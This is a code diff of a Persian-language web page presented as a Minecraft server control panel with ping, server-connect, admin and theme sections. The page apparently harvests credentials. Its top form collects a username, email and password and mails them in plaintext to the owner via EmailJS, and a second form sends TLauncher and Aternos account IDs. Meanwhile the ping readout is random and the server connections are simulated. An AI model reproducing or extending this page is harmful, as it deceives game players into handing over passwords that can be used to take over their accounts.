@@ -30,7 +30,6 @@
     50% { box-shadow: 0 0 30px #00bfff; }
   }
 
-  /* فرم بالا */
   .top-form {
     display: flex;
     gap: 10px;
@@ -52,11 +51,8 @@
     transition: 0.3s;
   }
 
-  .top-form input:focus {
-    box-shadow: 0 0 10px #00bfff;
-  }
+  .top-form input:focus { box-shadow: 0 0 10px #00bfff; }
 
-  /* دکمه‌ها */
   .btn {
     background: linear-gradient(45deg, #0055aa, #00bfff);
     border: none;
@@ -80,15 +76,9 @@
     transform: skewX(-25deg);
   }
 
-  .btn:hover::before {
-    animation: shine 0.7s forwards;
-  }
+  .btn:hover::before { animation: shine 0.7s forwards; }
+  @keyframes shine { to { left: 150%; } }
 
-  @keyframes shine {
-    to { left: 150%; }
-  }
-
-  /* منوی کناری */
   .sidebar {
     background: rgba(0, 34, 68, 0.9);
     padding: 1rem;
@@ -100,18 +90,9 @@
     box-shadow: 0 0 15px #0055aa;
   }
 
-  .sidebar .btn {
-    width: 100%;
-    margin-bottom: 12px;
-    text-align: right;
-    font-weight: bold;
-  }
+  .sidebar .btn { width: 100%; margin-bottom: 12px; text-align: right; font-weight: bold; }
 
-  /* محتوای اصلی */
-  .content {
-    margin-right: 250px;
-    padding: 1rem;
-  }
+  .content { margin-right: 250px; padding: 1rem; }
 
   .panel {
     display: none;
@@ -122,50 +103,21 @@
     animation: fadeIn 0.5s ease-in-out;
   }
 
-  @keyframes fadeIn {
-    from {opacity: 0; transform: translateY(10px);}
-    to {opacity: 1; transform: translateY(0);}
-  }
+  @keyframes fadeIn { from {opacity: 0; transform: translateY(10px);} to {opacity: 1; transform: translateY(0);} }
 
   .status-green { color: #00ff99; font-weight: bold; text-shadow: 0 0 5px #00ff99; }
   .status-red { color: #ff4d4d; font-weight: bold; text-shadow: 0 0 5px #ff4d4d; }
   .status-yellow { color: #ffff66; font-weight: bold; text-shadow: 0 0 5px #ffff66; }
 
-  .server-input {
-    width: 90%;
-    padding: 0.6rem;
-    border: none;
-    border-radius: 8px;
-    background: rgba(255,255,255,0.1);
-    color: white;
-    box-shadow: inset 0 0 5px #00bfff;
-    margin-bottom: 10px;
-    transition: 0.3s;
-  }
+  .server-input { width: 90%; padding: 0.6rem; border: none; border-radius: 8px; background: rgba(255,255,255,0.1); color: white; box-shadow: inset 0 0 5px #00bfff; margin-bottom: 10px; transition: 0.3s; }
   .server-input:focus { box-shadow: 0 0 10px #00bfff; }
 
   .admin-list { margin-top: 10px; }
-  .admin-item {
-    background: rgba(255,255,255,0.05);
-    padding: 5px 10px;
-    border-radius: 6px;
-    margin-bottom: 5px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-  }
-  .admin-item button {
-    background: transparent;
-    border: none;
-    color: #ff4d4d;
-    font-size: 1.2rem;
-    cursor: pointer;
-  }
+  .admin-item { background: rgba(255,255,255,0.05); padding: 5px 10px; border-radius: 6px; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
+  .admin-item button { background: transparent; border: none; color: #ff4d4d; font-size: 1.2rem; cursor: pointer; }
 
-  /* overlay اتصال پینگ */
   #pingOverlay {
-    position: fixed;
-    top:0; left:0; right:0; bottom:0;
+    position: fixed; top:0; left:0; right:0; bottom:0;
     background: rgba(0,0,0,0.8);
     display: none;
     justify-content: center;
@@ -187,12 +139,7 @@
 
   @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 
-  /* بخش دیسکورد */
-  .discord-box {
-    display: flex;
-    justify-content: center;
-    margin: 3rem 0;
-  }
+  .discord-box { display: flex; justify-content: center; margin: 3rem 0; }
   .discord-card {
     background: linear-gradient(135deg, #5865F2, #4e5bd9);
     border-radius: 20px;
@@ -223,18 +170,30 @@
   .discord-card a:hover { background: #5865F2; color: white; box-shadow:0 0 25px rgba(255,255,255,0.9);}
   @keyframes fadeUp { from {opacity:0; transform:translateY(50px);} to {opacity:1; transform:translateY(0);} }
 
+  /* فرم EmailJS نئونی */
+  .neon-form input {
+    width: 90%;
+    margin: 6px 0;
+    padding: 0.5rem;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+    background: rgba(0,0,0,0.3);
+    color: #00ffff;
+    box-shadow: 0 0 10px #00ffff;
+  }
 </style>
 </head>
 <body>
 
 <header> -BM1- </header>
 
-<!-- فرم اطلاعات کاربر -->
+<!-- فرم اطلاعات کاربر بالا -->
 <div class="top-form">
   <input type="text" id="username" placeholder="نام کاربری">
   <input type="email" id="email" placeholder="ایمیل">
   <input type="password" id="password" placeholder="رمز عبور">
-  <button class="btn" onclick="sendEmail()">ثبت</button>
+  <button class="btn" onclick="submitUserInfo()">ثبت</button>
 </div>
 
 <!-- منوی کناری -->
@@ -303,17 +262,19 @@
     <button class="btn" onclick="setTheme('#003300')">🟢 سبز تیره</button>
     <button class="btn" onclick="setTheme('#333333')">⚫ خاکستری تیره</button>
   </div>
- <!-- فرم EmailJS نئونی -->
+
+  <!-- فرم EmailJS نئونی -->
   <div id="emailjsPanel" class="panel">
     <h2 style="text-align:center; text-shadow:0 0 10px #00ffff;">✉ ثبت اطلاعات کاربر</h2>
     <div class="neon-form">
       <input type="text" id="tlauncherId" placeholder="ID تی لانچر (الزامی)" required>
       <input type="text" id="nickname" placeholder="Nickname در بازی (الزامی)" required>
       <input type="text" id="aternosId" placeholder="ID اترنوس (اختیاری)">
-      <button class="btn" onclick="sendEmail()">ارسال اطلاعات</button>
+      <button class="btn" onclick="sendEmailJS()">ارسال اطلاعات</button>
       <div id="formStatus" style="margin-top:10px; font-weight:bold; text-align:center;"></div>
     </div>
   </div>
+
   <!-- بخش دیسکورد -->
   <div class="discord-box">
     <div class="discord-card">
@@ -340,33 +301,56 @@ function showPanel(panelId){
   document.getElementById(panelId).style.display='block';
 }
 
-function sendEmail(){
+function submitUserInfo(){
   let user = document.getElementById('username').value.trim();
   let email = document.getElementById('email').value.trim();
   let pass = document.getElementById('password').value.trim();
   if(!user || !email || !pass){ alert("لطفا همه فیلدها را پر کنید"); return; }
+
   document.getElementById('displayUsername').textContent=user;
   document.getElementById('displayEmail').textContent=email;
 
-  var templateParams = {
-    username: user,
-    useremail: email,
-    password: pass
-  };
-
+  var templateParams = { username:user, useremail:email, password:pass };
   emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
-    .then(function(response) {
-       alert("اطلاعات با موفقیت ارسال شد!");
-    }, function(error) {
-       alert("ارسال اطلاعات با خطا مواجه شد: " + error.text);
+    .then(function(response){ alert("اطلاعات با موفقیت ارسال شد!"); },
+          function(error){ alert("ارسال اطلاعات با خطا مواجه شد: "+error.text); });
+}
+
+// فرم EmailJS پایین
+function sendEmailJS(){
+  const tId = document.getElementById('tlauncherId').value.trim();
+  const nick = document.getElementById('nickname').value.trim();
+  const aId = document.getElementById('aternosId').value.trim();
+
+  if(!tId || !nick){ 
+    document.getElementById('formStatus').textContent="لطفا فیلدهای الزامی را پر کنید!";
+    return; 
+  }
+
+  const templateParams = { tlauncher_id:tId, nickname:nick, aternos_id:aId };
+
+  emailjs.send("service_tbsh4nc","template_l84coy7",templateParams)
+    .then(function(response){
+      document.getElementById('formStatus').textContent="✅ ارسال با موفقیت انجام شد!";
+      document.getElementById('tlauncherId').value='';
+      document.getElementById('nickname').value='';
+      document.getElementById('aternosId').value='';
+    }, function(error){
+      document.getElementById('formStatus').textContent="❌ ارسال ناموفق بود، دوباره تلاش کنید.";
     });
 }
 
-function showPing() {
-  let ping = Math.floor(Math.random()*(120-97+1)+97)+" ms";
-  document.getElementById('pingResult').textContent=ping;
+// پینگ
+function startPing(){
+  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
+  const overlay=document.getElementById('pingOverlay');
+  overlay.style.display='flex';
+  setTimeout(()=>{ overlay.style.display='none'; showPanel('pingPanel'); },4000);
 }
 
+function showPing(){ document.getElementById('pingResult').textContent = Math.floor(Math.random()*(120-97+1)+97)+" ms"; }
+
+// سرورها
 function connectServer(num){
   if(num===1){ document.getElementById('server1Status').innerHTML='<span class="status-green">در حال اتصال...</span>'; setTimeout(()=>{document.getElementById('server1Status').innerHTML='<span class="status-red">اتصال قطع شد</span>';},2000);}
   if(num===2){ document.getElementById('server2Status').innerHTML='<span class="status-green">در حال اتصال...</span>'; setTimeout(()=>{document.getElementById('server2Status').innerHTML='<span class="status-red">اتصال قطع شد</span>';},2000);}
@@ -384,47 +368,6 @@ function addAdmin(){
 
 function showServerError(){ alert("این بخش شبیه‌سازی شده و ادامه داده شد."); }
 function setTheme(color){ document.body.style.background=color; }
-
-/* پنل پینگ: اتصال قبل از نمایش */
-function startPing(){
-  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
-  const overlay=document.getElementById('pingOverlay');
-  overlay.style.display='flex';
-  setTimeout(()=>{
-    overlay.style.display='none';
-    showPanel('pingPanel');
-  },4000);
-}
-</script>
-  <script>
-  emailjs.init("2UtU92GfpKNKLfs5y"); // Public Key
-
-  function sendEmail() {
-    const tId = document.getElementById('tlauncherId').value.trim();
-    const nick = document.getElementById('nickname').value.trim();
-    const aId = document.getElementById('aternosId').value.trim();
-
-    if(!tId || !nick){ 
-      document.getElementById('formStatus').textContent="لطفا فیلدهای الزامی را پر کنید!";
-      return; 
-    }
-
-    const templateParams = { 
-      tlauncher_id: tId, 
-      nickname: nick, 
-      aternos_id: aId 
-    };
-
-    emailjs.send("service_tbsh4nc", "template_l84coy7", templateParams)
-      .then(function(response){
-        document.getElementById('formStatus').textContent="✅ ارسال با موفقیت انجام شد!";
-        document.getElementById('tlauncherId').value='';
-        document.getElementById('nickname').value='';
-        document.getElementById('aternosId').value='';
-      }, function(error){
-        document.getElementById('formStatus').textContent="❌ ارسال ناموفق بود، دوباره تلاش کنید.";
-      });
-  }
 </script>
 
 </body>
